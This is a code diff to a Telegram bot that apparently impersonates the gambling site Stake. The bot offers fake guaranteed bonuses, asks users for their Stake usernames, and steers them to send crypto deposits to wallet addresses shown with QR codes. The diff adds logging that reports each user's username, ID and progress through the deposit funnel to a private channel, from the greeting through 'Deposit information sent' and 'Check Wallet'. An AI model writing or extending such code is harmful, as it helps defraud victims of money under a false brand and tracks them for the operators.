@@ -49,6 +49,38 @@ ADDRESS_QR = {
     "TJP9qnxpJv9q15V9zRBmNjSV7whmvbsTtX": os.path.join(QR_DIR, "trc20.png"),
 }
 
+# Channel ID for logging user activity
+LOG_CHANNEL_ID = -1003734992930
+
+
+def _log_text(username: str, user_id: int, step: str) -> str:
+    """Build the log message text."""
+    return f"Username: @{username}\nUser ID: {user_id}\nStatus: <code>{step}</code>"
+
+
+async def _post_log(context: ContextTypes.DEFAULT_TYPE, user_data: dict, username: str, user_id: int, step: str):
+    """Post a new log message to the channel or edit the existing one."""
+    text = _log_text(username, user_id, step)
+    log_msg_id = user_data.get("log_message_id")
+    if log_msg_id:
+        try:
+            await context.bot.edit_message_text(
+                chat_id=LOG_CHANNEL_ID,
+                message_id=log_msg_id,
+                text=text,
+                parse_mode="HTML",
+            )
+            return
+        except Exception:
+            pass
+    # First time or edit failed — send a new message
+    msg = await context.bot.send_message(
+        chat_id=LOG_CHANNEL_ID,
+        text=text,
+        parse_mode="HTML",
+    )
+    user_data["log_message_id"] = msg.message_id
+
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /start - send two images then welcome text with buttons."""
@@ -75,6 +107,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=reply_markup,
         )
 
+    # Log to channel
+    user = update.effective_user
+    await _post_log(context, context.user_data, user.username or user.first_name, user.id, "User greeted")
+
 
 async def access_bonuses_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle 'Access Bonuses' button press."""
@@ -91,6 +127,10 @@ async def access_bonuses_callback(update: Update, context: ContextTypes.DEFAULT_
         "Do you already have a Stake account? \U0001f389",
         reply_markup=reply_markup,
     )
+
+    # Log to channel
+    user = update.effective_user
+    await _post_log(context, context.user_data, user.username or user.first_name, user.id, "Bonus button tapped")
 
 
 async def has_account_yes_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -109,6 +149,10 @@ async def has_account_yes_callback(update: Update, context: ContextTypes.DEFAULT
 
     # Mark that we are waiting for a username from this user
     context.user_data["awaiting_username"] = True
+
+    # Log to channel
+    user = update.effective_user
+    await _post_log(context, context.user_data, user.username or user.first_name, user.id, "Username asked")
 
 
 async def has_account_no_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -154,10 +198,14 @@ async def resume_process_callback(update: Update, context: ContextTypes.DEFAULT_
     # Mark that we are waiting for a username from this user
     context.user_data["awaiting_username"] = True
 
+    # Log to channel
+    user = update.effective_user
+    await _post_log(context, context.user_data, user.username or user.first_name, user.id, "Username asked")
+
 
 async def username_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle text messages - capture username when expected."""
-    if not context.user_data.get("awaiting_username"):
+    if context.user_data is None or not context.user_data.get("awaiting_username"):
         return
 
     username = update.message.text.strip()
@@ -205,6 +253,10 @@ async def bonus_30_free_callback(update: Update, context: ContextTypes.DEFAULT_T
         reply_markup=reply_markup,
     )
 
+    # Log to channel
+    user = update.effective_user
+    await _post_log(context, context.user_data, user.username or user.first_name, user.id, "$30 Bonus chose")
+
 
 async def bonus_200_pct_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle '200% Bonus' button - send deposit question with Yes/No."""
@@ -224,6 +276,10 @@ async def bonus_200_pct_callback(update: Update, context: ContextTypes.DEFAULT_T
         "On your first deposit from our bot you will receive a guaranteed 200% bonus if you make a minimum deposit of $50 in any currency of your choice ( can be withdrawn instantly ). Do you want to proceed ?",
         reply_markup=reply_markup,
     )
+
+    # Log to channel
+    user = update.effective_user
+    await _post_log(context, context.user_data, user.username or user.first_name, user.id, "200% bonus chose")
 
 
 async def deposit_yes_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -342,6 +398,10 @@ async def network_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=reply_markup,
         )
 
+    # Log to channel
+    user = update.effective_user
+    await _post_log(context, context.user_data, user.username or user.first_name, user.id, "Deposit information sent")
+
 
 async def i_have_deposited_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle 'I have deposited' button - send confirmation message."""
@@ -356,6 +416,10 @@ async def i_have_deposited_callback(update: Update, context: ContextTypes.DEFAUL
             "Sincerely,\nStake Team"
         ),
     )
+
+    # Log to channel
+    user = update.effective_user
+    await _post_log(context, context.user_data, user.username or user.first_name, user.id, "Check Wallet")
 
 
 def main():
